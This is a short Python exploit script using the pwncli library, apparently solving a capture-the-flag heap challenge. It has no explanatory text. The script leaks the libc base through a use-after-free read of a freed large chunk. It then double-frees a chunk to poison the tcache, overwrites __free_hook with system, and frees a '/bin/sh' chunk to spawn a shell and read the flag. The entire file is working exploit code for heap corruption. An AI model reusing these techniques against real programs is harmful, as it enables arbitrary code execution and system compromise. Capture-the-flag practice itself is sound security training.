#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def alloc(size, data="a\n"):
    p.sendlineafter(">>", "1")
    p.sendlineafter("size:", str(size))
    p.sendafter("content:", data)

def dele(idx):
    p.sendlineafter(">>", "2")
    p.sendlineafter("idx:", str(idx))


def show(idx):
    p.sendlineafter(">>", "3")
    p.sendlineafter("idx:", str(idx))
    m = p.recvline()
    info(f"get msg: {m}")
    return m

alloc(0x420)
alloc(0x10)

dele(0)
m = show(0)

libc_base_addr = u64_ex(m[:-1]) - 0x3ebca0
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

alloc(0x10)

dele(2)
dele(2)

alloc(0x10, p64(libc.sym['__free_hook'])+b"\n")
alloc(0x10, "/bin/sh\n")
alloc(0x10, p64(libc.sym['system']) + b"\n")

dele(4)

get_flag_when_get_shell(p)

p.interactive()